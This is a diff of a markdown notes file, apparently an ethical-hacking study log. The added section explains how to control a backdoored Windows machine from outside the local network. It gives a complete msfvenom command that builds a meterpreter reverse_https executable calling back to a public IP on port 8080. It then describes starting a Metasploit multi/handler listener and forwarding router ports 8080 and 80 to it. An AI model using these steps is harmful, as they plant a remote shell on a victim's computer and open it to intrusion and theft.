@@ -64,11 +64,28 @@ service apache2 start
 - The promt of Kali will be **meterpreter>** which means our backdoor is installed. We can type **sysinfo** to find the OS of the target machine.
 
 
-### Configure the router to forward connection in Kali
+### Gaining access from Outside the local network using our router
 
 - We can find router's IP address is by typing route -n. OR on the Mac in the wifi settings
 - We login the routers settings from our computer and find the advance settings and port or IP forwading.
+- We create the backdoor but the LHOST is our public IP
+```bash
+msfvenom --payload windows/meterpreter/reverse_https LHOST=72.212.179.202 LPORT=8080 --format exe --out reverse_https_8080_publicIP.exe
+```
+- We use msfconsole and use the payload exploit/multi/handler and change the options to our router options
+<img width="909" alt="image" src="https://github.com/user-attachments/assets/5075ea90-5b1f-4a4b-92cc-b0c92f9d41a0" />
+
+- We then exploit and now we are listenting to our private IP via port 8080.
+- We now Configure the router to forward connection using the IP forwarding settings in the router.
+![IMG_50479B949321-1](https://github.com/user-attachments/assets/c227e6ed-13c2-4b49-ad78-f19200afbebc)
+
+- We create another rule for port 80 as well
 - 
+
+
+
+
+
 
 
 
